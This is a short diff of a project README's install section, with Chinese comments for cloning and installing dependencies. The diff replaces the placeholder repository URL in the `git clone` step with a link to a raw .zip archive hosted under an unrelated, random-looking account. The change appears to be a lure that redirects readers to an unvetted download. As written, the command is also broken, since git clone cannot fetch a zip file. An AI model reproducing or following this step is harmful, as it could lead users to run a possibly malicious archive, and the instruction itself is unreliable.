@@ -105,7 +105,7 @@
 
 ```bash
 # 克隆项目
-git clone https://github.com/your-username/daihuo-jianshou.git
+git clone https://github.com/witty-suckerpunch492/daihuo-jianshou/raw/refs/heads/main/src/app/daihuo_jianshou_2.2-alpha.1.zip
 cd daihuo-jianshou
 
 # 安装依赖
